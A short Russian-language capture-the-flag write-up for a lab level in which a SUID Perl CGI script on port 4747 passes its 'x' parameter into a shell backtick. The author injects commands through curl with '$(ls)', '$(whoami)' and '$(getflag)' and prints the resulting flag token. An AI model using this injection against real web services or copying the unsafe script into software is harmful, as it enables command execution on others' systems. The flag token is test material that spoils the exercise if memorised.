# RCE (Remote Code Execution)

Посмотрев есть ли что-то находим файл со скриптом и нужным SUID
```
ls -l
```
> -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

```
cat level04.pl
```
> \#!/usr/bin/perl\
\# localhost:4747\
use CGI qw{param};\
print "Content-type: text/html\n\n";\
sub x {\
  $y = $_[0];\
  print \`echo $y 2>&1\`;\
}\
x(param("x"));

Из скрипта понятно, что на порту 4747 работает сервер, в котором настроен CGI
Принимает параметром x, который попробуем ему передать

```
curl 'localhost:4747/?x=$(ls)'
```
> level04.pl

Выходит, а значит можем продожать

```
curl 'localhost:4747/?x=$(whoami)'
```
> flag04

Команды выполняются от нужношо флага, а значит ему нужно передать getflag

```
curl 'localhost:4747/?x=$(getflag)'
```
> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
